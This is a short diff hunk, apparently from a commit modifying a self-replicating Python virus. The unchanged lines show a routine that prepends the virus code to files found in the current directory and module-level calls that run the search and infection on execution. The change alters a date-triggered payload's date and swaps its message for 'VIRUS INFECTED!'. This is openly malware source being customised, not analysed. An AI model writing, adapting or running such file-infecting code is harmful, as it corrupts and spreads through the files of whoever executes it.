@@ -32,8 +32,8 @@ def infect(filestoinfect):
         f.write(virusstring + temp)
         f.close()
 def bomb():
-    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print "HAPPY BIRTHDAY CRANKLIN!"
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 10:
+        print "VIRUS INFECTED!"
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
 bomb()
